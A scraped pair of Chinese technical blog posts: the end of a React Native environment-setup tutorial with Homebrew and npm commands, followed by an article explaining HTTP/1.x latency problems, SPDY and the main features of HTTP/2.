<p>如果已经安转了以上的软件，需要更新到当前最新版本。<br>首先更新Homebrew的版本库：</p>
<blockquote><p>brew update</p></blockquote>
<p>更新Homebrew库的内容：</p>
<blockquote><p>brew upgrade</p></blockquote>
<p>清除不再使用的资源:</p>
<blockquote><p>brew cleanup</p></blockquote>
<h2>安装react-native</h2>
<p>npm是nodejs的包管理，使用npm可以安装nodejs的包，react-native也是nodejs的一个包。<br>使用npm安装react-native:</p>
<blockquote><p>npm install -g react-native</p></blockquote>
<p>安装react-native命令行工具:</p>
<blockquote><p>npm install -g react-native-cli</p></blockquote>
<p>运行命令:</p>
<blockquote><p>react-native -v</p></blockquote>
<p>得到结果:</p>
<pre><code>react-native-cli: 1.0.0
react-native: 0.20.0</code></pre>
<p>react-native安装成功</p>
<h2>第一个react-native项目</h2>
<p>新建第一个react-native项目</p>
<blockquote><p>react-native init HelloRN</p></blockquote>
<pre><code>o run your app on iOS:
   cd /Users/***/Documents/github/react-native/HelloRN
   react-native run-ios
   - or -
   Open /Users/***/Documents/github/react-native/HelloRN/ios/HelloRN.xcodeproj in Xcode
   Hit the Run button
To run your app on Android:
   Have an Android emulator running (quickest way to get started), or a device connected
   cd /Users/***/Documents/github/react-native/HelloRN
   react-native run-android</code></pre>
<p>运行ios:</p>
<blockquote><p>react-native run-ios</p></blockquote>
<p>在当前目录下面多了一个ios的目录，里面新建一个project，HelloRN的项目。</p>
<p>运行Android</p>
<blockquote><p>react-native run-android</p></blockquote>
<p>在当前目录下会多出一个anroid的目录，里面是android项目的文件。<br>运行<code>react-native</code>项目的时候首先会使用<code>react-native start</code>启动一个端口为<strong>8081</strong>的服务，用来提供JavaScript代码。</p>

                ", react-native:环境搭建,1531972056,240,1,463,1,1,https://segmentfault.com/a/1190000004477951
118,1,0,6,"
                    
<p>在我们所处的互联网世界中，HTTP协议算得上是使用最广泛的网络协议。最近http2.0的诞生使得它再次互联网技术圈关注的焦点。任何事物的消退和新生都有其背后推动的力量。对于HTTP来说，这力量复杂来说是各种技术细节的演进，简单来说是用户体验和感知的进化。用户总是希望网络上的信息能尽可能快的抵达眼球，越快越好，正是这种对“快”对追逐催生了今天的http2.0。</p>
<h1><strong>1. HTTP2.0的前世</strong></h1>
<p>http2.0的前世是http1.0和http1.1这两兄弟。虽然之前仅仅只有两个版本，但这两个版本所包含的协议规范之庞大，足以让任何一个有经验的工程师为之头疼。http1.0诞生于1996年，协议文档足足60页。之后第三年，http1.1也随之出生，协议文档膨胀到了176页。不过和我们手机端app升级不同的是，网络协议新版本并不会马上取代旧版本。实际上，1.0和1.1在之后很长的一段时间内一直并存，这是由于网络基础设施更新缓慢所决定的。今天的http2.0也是一样，新版协议再好也需要业界的产品锤炼，需要基础设施逐年累月的升级换代才能普及。</p>
<h3><strong>1.1 HTTP站在TCP之上</strong></h3>
<p>理解http协议之前一定要对TCP有一定基础的了解。HTTP是建立在TCP协议之上，TCP协议作为传输层协议其实离应用层并不远。HTTP协议的瓶颈及其优化技巧都是基于TCP协议本身的特性。比如TCP建立连接时三次握手有1.5个RTT（round-trip time）的延迟，为了避免每次请求的都经历握手带来的延迟，应用层会选择不同策略的http长链接方案。又比如TCP在建立连接的初期有慢启动（slow start）的特性，所以连接的重用总是比新建连接性能要好。</p>
<h3><strong>1.1 HTTP应用场景</strong></h3>
<p>http诞生之初主要是应用于web端内容获取，那时候内容还不像现在这样丰富，排版也没那么精美，用户交互的场景几乎没有。对于这种简单的获取网页内容的场景，http表现得还算不错。但随着互联网的发展和web2.0的诞生，更多的内容开始被展示（更多的图片文件），排版变得更精美（更多的css），更复杂的交互也被引入（更多的js）。用户打开一个网站首页所加载的数据总量和请求的个数也在不断增加。今天绝大部分的门户网站首页大小都会超过2M，请求数量可以多达100个。另一个广泛的应用是在移动互联网的客户端app，不同性质的app对http的使用差异很大。对于电商类app，加载首页的请求也可能多达10多个。对于微信这类IM，http请求可能仅限于语音和图片文件的下载，请求出现的频率并不算高。</p>
<h3><strong>1.2 因为延迟，所以慢</strong></h3>
<p>影响一个网络请求的因素主要有两个，带宽和延迟。今天的网络基础建设已经使得带宽得到极大的提升，大部分时候都是延迟在影响响应速度。http1.0被抱怨最多的就是<strong>连接无法复用</strong>，和<strong>head of line blocking</strong>这两个问题。理解这两个问题有一个十分重要的前提：客户端是依据域名来向服务器建立连接，一般PC端浏览器会针对单个域名的server同时建立6～8个连接，手机端的连接数则一般控制在4～6个。显然连接数并不是越多越好，资源开销和整体延迟都会随之增大。</p>
<p><strong>连接无法复用</strong>会导致每次请求都经历三次握手和慢启动。三次握手在高延迟的场景下影响较明显，慢启动则对文件类大请求影响较大。</p>
<p><strong>head of line blocking</strong>会导致带宽无法被充分利用，以及后续健康请求被阻塞。假设有5个请求同时发出，如下图：</p>
<p>[图1]<br>&lt;img src=""<a href=""https://github.com/music4kid/music4kid.github.io/blob/master/images/http1.0_blocking.png?raw=true&amp;quot"" rel=""nofollow noreferrer"">https://github.com/music4kid/music4kid.github.io/blob/master/images/http1.0_blocking.png?raw=true&amp;quot</a>; width=""485""&gt;</p>
<p>对于http1.0的实现，在第一个请求没有收到回复之前，后续从应用层发出的请求只能排队，请求2，3，4，5只能等请求1的response回来之后才能逐个发出。网络通畅的时候性能影响不大，一旦请求1的request因为什么原因没有抵达服务器，或者response因为网络阻塞没有及时返回，影响的就是所有后续请求，问题就变得比较严重了。</p>
<h3><strong>1.3 解决连接无法复用</strong></h3>
<p>http1.0协议头里可以设置Connection:Keep-Alive。在header里设置Keep-Alive可以在一定时间内复用连接，具体复用时间的长短可以由服务器控制，一般在15s左右。到http1.1之后Connection的默认值就是Keep-Alive，如果要关闭连接复用需要显式的设置Connection:Close。一段时间内的连接复用对PC端浏览器的体验帮助很大，因为大部分的请求在集中在一小段时间以内。但对移动app来说，成效不大，app端的请求比较分散且时间跨度相对较大。所以移动端app一般会从应用层寻求其它解决方案，长连接方案或者伪长连接方案：</p>
<h4><strong>方案一：基于tcp的长链接</strong></h4>
<p>现在越来越多的移动端app都会建立一条自己的长链接通道，通道的实现是基于tcp协议。基于tcp的socket编程技术难度相对复杂很多，而且需要自己制定协议，但带来的回报也很大。信息的上报和推送变得更及时，在请求量爆发的时间点还能减轻服务器压力（http短连接模式会频繁的创建和销毁连接）。不止是IM app有这样的通道，像淘宝这类电商类app都有自己的专属长连接通道了。现在业界也有不少成熟的方案可供选择了，google的protobuf就是其中之一。</p>
<h4><strong>方案二：http long-polling</strong></h4>
<p>long-polling可以用下图表示：</p>
<p>[图2]</p>
<p>&lt;img src=""<a href=""https://github.com/music4kid/music4kid.github.io/blob/master/images/http_polling.png?raw=true&amp;quot"" rel=""nofollow noreferrer"">https://github.com/music4kid/music4kid.github.io/blob/master/images/http_polling.png?raw=true&amp;quot</a>; width=""356""&gt;</p>
<p>客户端在初始状态就会发送一个polling请求到服务器，服务器并不会马上返回业务数据，而是等待有新的业务数据产生的时候再返回。所以连接会一直被保持，一旦结束马上又会发起一个新的polling请求，如此反复，所以一直会有一个连接被保持。服务器有新的内容产生的时候，并不需要等待客户端建立一个新的连接。做法虽然简单，但有些难题需要攻克才能实现稳定可靠的业务框架：</p>
<ul>
<li><p>和传统的http短链接相比，长连接会在用户增长的时候极大的增加服务器压力</p></li>
<li><p>移动端网络环境复杂，像wifi和4g的网络切换，进电梯导致网络临时断掉等，这些场景都需要考虑怎么重建健康的连接通道。</p></li>
<li><p>这种polling的方式稳定性并不好，需要做好数据可靠性的保证，比如重发和ack机制。</p></li>
<li><p>polling的response有可能会被中间代理cache住，要处理好业务数据的过期机制。</p></li>
</ul>
<p>long-polling方式还有一些缺点是无法克服的，比如每次新的请求都会带上重复的header信息，还有数据通道是单向的，主动权掌握在server这边，客户端有新的业务请求的时候无法及时传送。</p>
<h4><strong>方案三：http streaming</strong></h4>
<p>http streaming流程大致如下：</p>
<p>[图3]</p>
<p>&lt;img src=""<a href=""https://github.com/music4kid/music4kid.github.io/blob/master/images/http_streaming.png?raw=true&amp;quot"" rel=""nofollow noreferrer"">https://github.com/music4kid/music4kid.github.io/blob/master/images/http_streaming.png?raw=true&amp;quot</a>; width=""363""&gt;</p>
<p>同long-polling不同的是，server并不会结束初始的streaming请求，而是持续的通过这个通道返回最新的业务数据。显然这个数据通道也是单向的。streaming是通过在server response的头部里增加""Transfer Encoding: chunked""来告诉客户端后续还会有新的数据到来。除了和long－polling相同的难点之外，streaming还有几个缺陷：</p>
<ul>
<li><p>有些代理服务器会等待服务器的response结束之后才会将结果推送到请求客户端。对于streaming这种永远不会结束的方式来说，客户端就会一直处于等待response的过程中。</p></li>
<li><p>业务数据无法按照请求来做分割，所以客户端没收到一块数据都需要自己做协议解析，也就是说要做自己的协议定制。</p></li>
</ul>
<p>streaming不会产生重复的header数据。</p>
<h4><strong>方案四：web socket</strong></h4>
<p>WebSocket和传统的tcp socket连接相似，也是基于tcp协议，提供双向的数据通道。WebSocket优势在于提供了message的概念，比基于字节流的tcp socket使用更简单，同时又提供了传统的http所缺少的长连接功能。不过WebSocket相对较新，2010年才起草，并不是所有的浏览器都提供了支持。各大浏览器厂商最新的版本都提供了支持。</p>
<h3><strong>1.4 解决head of line blocking</strong></h3>
<p>Head of line blocking(以下简称为holb)是http2.0之前网络体验的最大祸源。正如图1中所示，健康的请求会被不健康的请求影响，而且这种体验的损耗受网络环境影响，出现随机且难以监控。为了解决holb带来的延迟，协议设计者设计了一种新的pipelining机制。</p>
<h4><strong>http pipelining</strong></h4>
<p>pipelining的流程图可以用下图表示：</p>
<p>[图4]</p>
<p>&lt;img src=""<a href=""https://github.com/music4kid/music4kid.github.io/blob/master/images/pipelining.png?raw=true&amp;quot"" rel=""nofollow noreferrer"">https://github.com/music4kid/music4kid.github.io/blob/master/images/pipelining.png?raw=true&amp;quot</a>; width=""375""&gt;</p>
<p>和图一相比最大的差别是，请求2，3，4，5不用等请求1的response返回之后才发出，而是几乎在同一时间把request发向了服务器。2，3，4，5及所有后续共用该连接的请求节约了等待的时间，极大的降低了整体延迟。下图可以清晰的看出这种新机制对延迟的改变：</p>
<p>[图5]</p>
<p>&lt;img src=""<a href=""https://github.com/music4kid/music4kid.github.io/blob/master/images/http_pipelining_performance.png?raw=true&amp;quot"" rel=""nofollow noreferrer"">https://github.com/music4kid/music4kid.github.io/blob/master/images/http_pipelining_performance.png?raw=true&amp;quot</a>; width=""625""&gt;</p>
<p>不过pipelining并不是救世主，它也存在不少缺陷：</p>
<ul>
<li><p>pipelining只能适用于http1.1，一般来说，支持http1.1的server都要求支持pipelining。</p></li>
<li><p>只有幂等的请求（GET，HEAD）能使用pipelining，非幂等请求比如POST不能使用，因为请求之间可能会存在先后依赖关系。</p></li>
<li><p>head of line blocking并没有完全得到解决，server的response还是要求依次返回，遵循FIFO(first in first out)原则。也就是说如果请求1的response没有回来，2，3，4，5的response也不会被送回来。</p></li>
<li><p>绝大部分的http代理服务器不支持pipelining。</p></li>
<li><p>和不支持pipelining的老服务器协商有问题。</p></li>
<li><p>可能会导致新的Front of queue blocking问题。</p></li>
</ul>
<p>正是因为有这么多的问题，各大浏览器厂商要么是根本就不支持pipelining，要么就是默认关掉了pipelining机制，而且启用的条件十分苛刻。可以参考chrome对于pipeling的<a href=""https://www.chromium.org/developers/design-documents/network-stack/http-pipelining"" rel=""nofollow noreferrer"">问题描述</a>。</p>
<h3><strong>1.5 其它奇技淫巧</strong></h3>
<p>为了解决延迟带来的苦恼，永远都会有聪明的探索者找出新的捷径来。互联网的蓬勃兴盛催生出了各种新奇技巧，我们来依次看下这些“捷径”及各自的优缺点。</p>
<h4><strong>Spriting（图片合并）</strong></h4>
<p>Spriting指的是将多个小图片合并到一张大的图片里，这样多个小的请求就被合并成了一个大的图片请求，然后再利用js或者css文件来取出其中的小张图片使用。好处显而易见，请求数减少，延迟自然低。坏处是文件的粒度变大了，有时候我们可能只需要其中一张小图，却不得不下载整张大图，cache处理也变得麻烦，在只有一张小图过期的情况下，为了获得最新的版本，不得不从服务器下载完整的大图，即使其它的小图都没有过期，显然浪费了流量。</p>
<h4><strong>Inlining（内容内嵌）</strong></h4>
<p>Inlining的思考角度和spriting类似，是将额外的数据请求通过base64编码之后内嵌到一个总的文件当中。比如一个网页有一张背景图，我们可以通过如下代码嵌入：</p>
<p>background: url(data:image/png;base64,&lt;data&gt;)</p>
<p>data部分是base64编码之后的字节码，这样也避免了一次多余的http请求。但这种做法也有着和spriting相同的问题，资源文件被绑定到了其它文件，粒度变得难以控制。</p>
<h4><strong>Concatenation（文件合并）</strong></h4>
<p>Concatenation主要是针对js这类文件，现在前端开发交互越来越多，零散的js文件也在变多。将多个js文件合并到一个大的文件里在做一些压缩处理也可以减小延迟和传输的数据量。但同样也面临着粒度变大的问题，一个小的js代码改动会导致整个js文件被下载。</p>
<h4><strong>Domain Sharding（域名分片）</strong></h4>
<p>前面我提到过很重要的一点，浏览器或者客户端是根据domain（域名）来建立连接的。比如针对www.example.com只允许同时建立2个连接，但mobile.example.com被认为是另一个域名，可以再建立两个新的连接。依次类推，如果我再多建立几个sub domain（子域名），那么同时可以建立的http请求就会更多，这就是Domain Sharding了。连接数变多之后，受限制的请求就不需要等待前面的请求完成才能发出了。这个技巧被大量的使用，一个颇具规模的网页请求数可以超过100，使用domain sharding之后同时建立的连接数可以多到50个甚至更多。</p>
<p>这么做当然增加了系统资源的消耗，但现在硬件资源升级非常之快，和用户宝贵的等待时机相比起来实在微不足道。</p>
<p>domain sharding还有一大好处，对于资源文件来说一般是不需要cookie的，将这些不同的静态资源文件分散在不同的域名服务器上，可以减小请求的size。</p>
<p>不过domain sharding只有在请求数非常之多的场景下才有明显的效果。而且请求数也不是越多越好，资源消耗是一方面，另一点是由于tcp的slow start会导致每个请求在初期都会经历slow start，还有tcp 三次握手，DNS查询的延迟。这一部分带来的时间损耗和请求排队同样重要，到底怎么去平衡这二者就需要取一个可靠的连接数中间值，这个值的最终确定要通过反复的测试。移动端浏览器场景建议不要使用domain sharding，具体细节参考<a href=""http://www.mobify.com/blog/domain-sharding-bad-news-mobile-performance/"" rel=""nofollow noreferrer"">这篇文章</a>。</p>
<h1><strong>2. 开拓者SPDY</strong></h1>
<p>http1.0和1.1虽然存在这么多问题，业界也想出了各种优化的手段，但这些方法手段都是在尝试绕开协议本身的缺陷，都有种隔靴搔痒，治标不治本的感觉。直到2012年google如一声惊雷提出了SPDY的方案，大家才开始从正面看待和解决老版本http协议本身的问题，这也直接加速了http2.0的诞生。实际上，http2.0是以SPDY为原型进行讨论和标准化的。为了给http2.0让路，google已决定在2016年不再继续支持SPDY开发，但在http2.0出生之前，SPDY已经有了相当规模的应用，作为一个过渡方案恐怕在还将一段时间内继续存在。现在不少app客户端和server都已经使用了SPDY来提升体验，http2.0在老的设备和系统上还无法使用（iOS系统只有在iOS9+上才支持），所以可以预见未来几年spdy将和http2.0共同服务的情况。</p>
<h3><strong>2.1 SPDY的目标</strong></h3>
<p>SPDY的目标在一开始就是瞄准http1.x的痛点，即延迟和安全性。我们上面通篇都在讨论延迟，至于安全性，由于http是明文协议，其安全性也一直被业界诟病，不过这是另一个大的话题。如果以降低延迟为目标，应用层的http和传输层的tcp都是都有调整的空间，不过tcp作为更底层协议存在已达数十年之久，其实现已深植全球的网络基础设施当中，如果要动必然伤经动骨，业界响应度必然不高，所以SPDY的手术刀对准的是http。</p>
<ul>
<li><p>降低延迟，客户端的单连接单请求，server的FIFO响应队列都是延迟的大头。</p></li>
<li><p>http最初设计都是客户端发起请求，然后server响应，server无法主动push内容到客户端。</p></li>
<li><p>压缩http header，http1.x的header越来越膨胀，cookie和user agent很容易让header的size增至1kb大小，甚至更多。而且由于http的无状态特性，header必须每次request都重复携带，很浪费流量。</p></li>
</ul>
<p>为了增加业界响应的可能性，聪明的google一开始就避开了从传输层动手，而且打算利用开源社区的力量以提高扩散的力度，对于协议使用者来说，也只需要在请求的header里设置user agent，然后在server端做好支持即可，极大的降低了部署的难度。SPDY的设计如下：</p>
<p>[图6]</p>
<p>&lt;img src=""<a href=""https://github.com/music4kid/music4kid.github.io/blob/master/images/spdy.png?raw=true&amp;quot"" rel=""nofollow noreferrer"">https://github.com/music4kid/music4kid.github.io/blob/master/images/spdy.png?raw=true&amp;quot</a>; width=""215""&gt;</p>
<p>SPDY位于HTTP之下，TCP和SSL之上，这样可以轻松兼容老版本的HTTP协议(将http1.x的内容封装成一种新的frame格式)，同时可以使用已有的SSL功能。SPDY的功能可以分为基础功能和高级功能两部分，基础功能默认启用，高级功能需要手动启用。</p>
<h4><strong>SPDY基础功能</strong></h4>
<ul>
<li><p>多路复用（multiplexing）。多路复用通过多个请求stream共享一个tcp连接的方式，解决了http1.x holb（head of line blocking）的问题，降低了延迟同时提高了带宽的利用率。</p></li>
<li><p>请求优先级（request prioritization）。多路复用带来一个新的问题是，在连接共享的基础之上有可能会导致关键请求被阻塞。SPDY允许给每个request设置优先级，这样重要的请求就会优先得到响应。比如浏览器加载首页，首页的html内容应该优先展示，之后才是各种静态资源文件，脚本文件等加载，这样可以保证用户能第一时间看到网页内容。</p></li>
<li><p>header压缩。前面提到过几次http1.x的header很多时候都是重复多余的。选择合适的压缩算法可以减小包的大小和数量。SPDY对header的压缩率可以达到80%以上，低带宽环境下效果很大。</p></li>
</ul>
<h4><strong>SPDY高级功能</strong></h4>
<ul>
<li><p>server推送（server push）。http1.x只能由客户端发起请求，然后服务器被动的发送response。开启server push之后，server通过X-Associated-Content header（X-开头的header都属于非标准的，自定义header）告知客户端会有新的内容推送过来。在用户第一次打开网站首页的时候，server将资源主动推送过来可以极大的提升用户体验。</p></li>
<li><p>server暗示（server hint）。和server push不同的是，server hint并不会主动推送内容，只是告诉有新的内容产生，内容的下载还是需要客户端主动发起请求。server hint通过X-Subresources header来通知，一般应用场景是客户端需要先查询server状态，然后再下载资源，可以节约一次查询请求。</p></li>
</ul>
<h3><strong>2.2 SPDY的成绩</strong></h3>
<p>SPDY的成绩可以用google官方的一个数字来说明：页面加载时间相比于http1.x减少了64%。而且各大浏览器厂商在SPDY诞生之后的1年多里都陆续支持了SPDY，不少大厂app和server端框架也都将SPDY应用到了线上的产品当中。</p>
<p>google的官网也给出了他们自己做的一份测试数据。测试对象是25个访问量排名靠前的网站首页，家用网络%1的丢包率，每个网站测试10次取平均值。结果如下：</p>
<p>[图7]</p>
<p>&lt;img src=""<a href=""https://github.com/music4kid/music4kid.github.io/blob/master/images/spdy_result.png?raw=true&amp;quot"" rel=""nofollow noreferrer"">https://github.com/music4kid/music4kid.github.io/blob/master/images/spdy_result.png?raw=true&amp;quot</a>; width=""860""&gt;</p>
<p>不开启ssl的时候提升在 27% - 60%，开启之后为39% - 55%。<br>这份测试结果有两点值得特别注意：</p>
<h4><strong>连接数的选择</strong></h4>
<p>连接到底是基于域名来建立，还是不做区分所有子域名都共享一个连接，这个策略选择上值得商榷。google的测试结果测试了两种方案，看结果似乎是单一连接性能高于多域名连接方式。之所以出现这种情况是由于网页所有的资源请求并不是同一时间发出，后续发出的子域名请求如果能复用之前的tcp连接当然性能更好。实际应用场景下应该也是单连接共享模式表现好。</p>
<h4><strong>带宽的影响</strong></h4>
<p>测试基于两种带宽环境，一慢一快。网速快的环境下对减小延迟的提升更大，单连接模式下可以提升至60%。原因也比较简单，带宽越大，复用连接的请求完成越快，由于三次握手和慢启动导致的延迟损耗就变得更明显。</p>
<p>出了连接模式和带宽之外，丢包率和RTT也是需要测试的参数。SPDY对header的压缩有80%以上，整体包大小能减少大概40%，发送的包越少，自然受丢包率影响也就越小，所以丢包率大的恶劣环境下SPDY反而更能提升体验。下图是受丢包率影响的测试结果，丢包率超过2.5％之后就没有提升了：</p>
<p>[图8]</p>
<p>&lt;img src=""<a href=""https://github.com/music4kid/music4kid.github.io/blob/master/images/spdy_loss.png?raw=true&amp;quot"" rel=""nofollow noreferrer"">https://github.com/music4kid/music4kid.github.io/blob/master/images/spdy_loss.png?raw=true&amp;quot</a>; width=""586""&gt;</p>
<p>RTT越大，延迟会越大，在高RTT的场景下，由于SPDY的request是并发进行的，所有对包的利用率更高，反而能更明显的减小总体延迟。测试结果如下：</p>
<p>[图9]</p>
<p>&lt;img src=""<a href=""https://github.com/music4kid/music4kid.github.io/blob/master/images/spdy_rtt.png?raw=true&amp;quot"" rel=""nofollow noreferrer"">https://github.com/music4kid/music4kid.github.io/blob/master/images/spdy_rtt.png?raw=true&amp;quot</a>; width=""585""&gt;</p>
<p>SPDY从2012年诞生到2016停止维护，时间跨度对于网络协议来说其实非常之短。如果HTTP2.0没有出来，google或许能收集到更多业界产品的真实反馈和数据，毕竟google自己的测试环境相对简单。但SPDY也完成了自己的使命，作为一贯扮演拓荒者角色的google应该也早就预见了这样的结局。SPDY对产品网络体验的提升到底如何，恐怕只有各大厂产品经理才清楚了。</p>
<h1><strong>3. 救世主HTTP2.0</strong></h1>
<p>SPDY的诞生和表现说明了两件事情：一是在现有互联网设施基础和http协议广泛使用的前提下，是可以通过修改协议层来优化http1.x的。二是针对http1.x的修改确实效果明显而且业界反馈很好。正是这两点让IETF（Internet Enginerring Task Force）开始正式考虑制定HTTP2.0的计划，最后决定以SPDY／3为蓝图起草HTTP2.0，SPDY的部分设计人员也被邀请参与了HTTP2.0的设计。</p>
<h3><strong>3.1 HTTP2.0需要考虑的问题</strong></h3>
<p>HTTP2.0与SPDY的起点不同，SPDY可以说是google的“玩具”，最早出现在自家的chrome浏览器和server上，好不好玩以及别人会不会跟着一起玩对google来说无关痛痒。但HTTP2.0作为业界标准还没出生就是众人瞩目的焦点，一开始如果有什么瑕疵或者不兼容的问题影响可能又是数十年之久，所以考虑的问题和角度要非常之广。我们来看下HTTP2.0一些重要的设计前提：</p>
<ul>
<li><p>客户端向server发送request这种基本模型不会变。</p></li>
<li><p>老的scheme不会变，使用<a>http://</a>和<a>https://</a>的服务和应用不会要做任何更改，不会有http2://。</p></li>
<li><p>使用http1.x的客户端和服务器可以无缝的通过代理方式转接到http2.0上。</p></li>
<li><p>不识别http2.0的代理服务器可以将请求降级到http1.x。</p></li>
</ul>
<p>因为客户端和server之间在确立使用http1.x还是http2.0之前，必须要要确认对方是否支持http2.0，所以这里必须要有个协商的过程。最简单的协商也要有一问一答，客户端问server答，即使这种最简单的方式也多了一个RTT的延迟，我们之所以要修改http1.x就是为了降低延迟，显然这个RTT我们是无法接受的。google制定SPDY的时候也遇到了这个问题，他们的办法是强制SPDY走https，在SSL层完成这个协商过程。ssl层的协商在http协议通信之前，所以是最适合的载体。google为此做了一个tls的拓展，叫NPN（Next Protocol Negotiation），从名字上也可以看出，这个拓展主要目的就是为了协商下一个要使用的协议。HTTP2.0虽然也采用了相同的方式，不过HTTP2.0经过激烈的讨论，最终还是没有强制HTTP2.0要走ssl层，大部分浏览器厂商（除了IE）却只实现了基于https的2.0协议。HTTP2.0没有使用NPN，而是另一个tls的拓展叫ALPN（Application Layer Protocol Negotiation）。SPDY也打算从NPN迁移到ALPN了。</p>
<p>各浏览器（除了IE）之所以只实现了基于SSL的HTTP2.0，另一个原因是走SSL请求的成功率会更高，被SSL封装的request不会被监听和修改，这样网络中间的网络设备就无法基于http1.x的认知去干涉修改request，http2.0的request如果被意外的修改，请求的成功率自然会下降。</p>
<p>HTTP2.0协议没有强制使用SSL是因为听到了很多的反对声音，毕竟https和http相比，在不优化的前提下性能差了不少，要把https优化到几乎不增加延迟的程度又需要花费不少力气。IETF面对这种两难的处境做了妥协，但大部分浏览器厂商（除了IE）并不买帐，他们只认https2.0。对于app开发者来说，他们可以坚持使用没有ssl的http2.0，不过要承担一个多余的RTT延迟和请求可能被破坏的代价。</p>
<h3><strong>3.1 HTTP2.0主要改动</strong></h3>
<p>HTTP2.0作为新版协议，改动细节必然很多，不过对应用开发者和服务提供商来说，影响较大的就几点。</p>
<h4><strong>新的二进制格式（Binary Format）</strong></h4>
<p>http1.x诞生的时候是明文协议，其格式由三部分组成：start line（request line或者status line），header，body。要识别这3部分就要做协议解析，http1.x的解析是基于文本。基于文本协议的格式解析存在天然缺陷，文本的表现形式有多样性，要做到健壮性考虑的场景必然很多，二进制则不同，只认0和1的组合。基于这种考虑http2.0的协议解析决定采用二进制格式，实现方便且健壮。</p>
<p>有人可能会觉得基于文本的http调试方便很多，像firebug，chrome，charles等不少工具都可以即时调试修改请求。实际上现在很多请求都是走https了，要调试https请求必须有私钥才行。http2.0的绝大部分request应该都是走https，所以调试方便无法作为一个有力的考虑因素了。curl，tcpdump，wireshark这些工具会更适合http2.0的调试。</p>
<p>http2.0用binary格式定义了一个一个的frame，和http1.x的格式对比如下图：</p>
<p>[图10]</p>
<p>&lt;img src=""<a href=""https://github.com/music4kid/music4kid.github.io/blob/master/images/http1xvs2.png?raw=true&amp;quot"" rel=""nofollow noreferrer"">https://github.com/music4kid/music4kid.github.io/blob/master/images/http1xvs2.png?raw=true&amp;quot</a>; width=""455""&gt;</p>
<p>http2.0的格式定义更接近tcp层的方式，这张二机制的方式十分高效且精简。length定义了整个frame的开始到结束，type定义frame的类型（一共10种），flags用bit位定义一些重要的参数，stream id用作流控制，剩下的payload就是request的正文了。</p>
<p>虽然看上去协议的格式和http1.x完全不同了，实际上http2.0并没有改变http1.x的语义，只是把原来http1.x的header和body部分用frame重新封装了一层而已。调试的时候浏览器甚至会把http2.0的frame自动还原成http1.x的格式。具体的协议关系可以用下图表示：</p>
<p>[图11]</p>
<p>&lt;img src=""<a href=""https://github.com/music4kid/music4kid.github.io/blob/master/images/http2_frame.png?raw=true&amp;quot"" rel=""nofollow noreferrer"">https://github.com/music4kid/music4kid.github.io/blob/master/images/http2_frame.png?raw=true&amp;quot</a>; width=""455""&gt;</p>
<h4><strong>连接共享</strong></h4>
<p>http2.0要解决的一大难题就是多路复用（MultiPlexing），即连接共享。上面协议解析中提到的stream id就是用作连接共享机制的。一个request对应一个stream并分配一个id，这样一个连接上可以有多个stream，每个stream的frame可以随机的混杂在一起，接收方可以根据stream id将frame再归属到各自不同的request里面。</p>
<p>前面还提到过连接共享之后，需要优先级和请求依赖的机制配合才能解决关键请求被阻塞的问题。http2.0里的每个stream都可以设置又优先级（Priority）和依赖（Dependency）。优先级高的stream会被server优先处理和返回给客户端，stream还可以依赖其它的sub streams。优先级和依赖都是可以动态调整的。动态调整在有些场景下很有用，假想用户在用你的app浏览商品的时候，快速的滑动到了商品列表的底部，但前面的请求先发出，如果不把后面的请求优先级设高，用户当前浏览的图片要到最后才能下载完成，显然体验没有设置优先级好。同理依赖在有些场景下也有妙用。</p>
<h4><strong>header压缩</strong></h4>
<p>前面提到过http1.x的header由于cookie和user agent很容易膨胀，而且每次都要重复发送。http2.0使用encoder来减少需要传输的header大小，通讯双方各自cache一份header fields表，既避免了重复header的传输，又减小了需要传输的大小。高效的压缩算法可以很大的压缩header，减少发送包的数量从而降低延迟。</p>
<p>这里普及一个小知识点。现在大家都知道tcp有slow start的特性，三次握手之后开始发送tcp segment，第一次能发送的没有被ack的segment数量是由initial tcp window大小决定的。这个initial tcp window根据平台的实现会有差异，但一般是2个segment或者是4k的大小（一个segment大概是1500个字节），也就是说当你发送的包大小超过这个值的时候，要等前面的包被ack之后才能发送后续的包，显然这种情况下延迟更高。intial window也并不是越大越好，太大会导致网络节点的阻塞，丢包率就会增加，具体细节可以参考IETF<a href=""https://tools.ietf.org/html/rfc3390"" rel=""nofollow noreferrer"">这篇文章</a>。http的header现在膨胀到有可能会超过这个intial window的值了，所以更显得压缩header的重要性。</p>
<h4><strong>压缩算法的选择</strong></h4>
<p>SPDY/2使用的是gzip压缩算法，但后来出现的两种攻击方式<a href=""https://en.wikipedia.org/wiki/BREACH_%28security_exploit%29"" rel=""nofollow noreferrer"">BREACH</a>和<a href=""https://en.wikipedia.org/wiki/CRIME"" rel=""nofollow noreferrer"">CRIME</a>使得即使走ssl的SPDY也可以被破解内容，最后综合考虑采用的是一种叫<a href=""https://http2.github.io/http2-spec/compression.html"" rel=""nofollow noreferrer"">HPACK</a>的压缩算法。这两个漏洞和相关算法可以点击链接查看更多的细节，不过这种漏洞主要存在于浏览器端，因为需要通过javascript来注入内容并观察payload的变化。</p>
<h4><strong>重置连接表现更好</strong></h4>
<p>很多app客户端都有取消图片下载的功能场景，对于http1.x来说，是通过设置tcp segment里的reset flag来通知对端关闭连接的。这种方式会直接断开连接，下次再发请求就必须重新建立连接。http2.0引入RST_STREAM类型的frame，可以在不断开连接的前提下取消某个request的stream，表现更好。</p>
<h4><strong>Server Push</strong></h4>
<p>Server Push的功能前面已经提到过，http2.0能通过push的方式将客户端需要的内容预先推送过去，所以也叫“cache push”。另外有一点值得注意的是，客户端如果退出某个业务场景，出于流量或者其它因素需要取消server push，也可以通过发送RST_STREAM类型的frame来做到。</p>
<h4><strong>流量控制（Flow Control）</strong></h4>
<p>TCP协议通过sliding window的算法来做流量控制。发送方有个sending window，接收方有receive window。http2.0的flow control是类似receive window的做法，数据的接收方通过告知对方自己的flow window大小表明自己还能接收多少数据。只有Data类型的frame才有flow control的功能。对于flow control，如果接收方在flow window为零的情况下依然更多的frame，则会返回block类型的frame，这张场景一般表明http2.0的部署出了问题。</p>
<h4><strong>Nagle Algorithm vs TCP Delayed Ack</strong></h4>
<p>tcp协议优化的一个经典场景是：<a href=""https://en.wikipedia.org/wiki/Nagle's_algorithm"" rel=""nofollow noreferrer"">Nagle算法</a>和<a href=""https://en.wikipedia.org/wiki/TCP_delayed_acknowledgment"" rel=""nofollow noreferrer"">Berkeley的delayed ack算法</a>的对立。http2.0并没有对tcp层做任何修改，所以这种对立导致的高延迟问题依然存在。要么通过TCP_NODELAY禁用Nagle算法，要么通过TCP_QUICKACK禁用delayed ack算法。貌似http2.0官方建议是设置TCP_NODELAY。</p>
